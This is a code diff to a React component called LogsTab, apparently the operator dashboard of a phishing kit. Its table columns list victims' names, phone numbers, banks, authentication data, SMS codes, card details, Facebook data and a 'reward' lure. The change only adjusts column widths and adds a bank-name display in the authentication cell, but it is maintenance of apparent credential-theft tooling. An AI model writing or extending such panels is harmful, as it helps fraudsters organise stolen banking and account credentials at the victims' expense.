@@ -2273,19 +2273,19 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           <table className="w-full table-auto border-collapse text-[12px] text-left lg:text-[13px]">
             <thead className={`text-[13px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="min-w-[75px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
-                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
-                <th className="min-w-[180px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
-                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Autenticação</th>
-                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
-                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
-                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
-                <th className="min-w-[150px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
+                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
+                <th className="min-w-[55px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
+                <th className="min-w-[150px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
+                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="min-w-[115px] px-2 py-3 font-semibold whitespace-nowrap">Autenticação</th>
+                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
+                <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
+                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
+                <th className="min-w-[125px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
@@ -2537,6 +2537,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         if (hasAuth) {
                           return (
                             <div className="space-y-1 text-[12px] font-medium leading-tight">
+                              {(fd.bankName || fd.bankSlug) && (
+                                <div className="font-extrabold text-[12px] text-sky-600 dark:text-sky-400 break-words [overflow-wrap:anywhere]">
+                                  {String(fd.bankName || fd.bankSlug)}
+                                </div>
+                              )}
                               {authPhone && (
                                 <div className="flex min-w-0 items-start gap-1">
                                   <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Tel:</span>
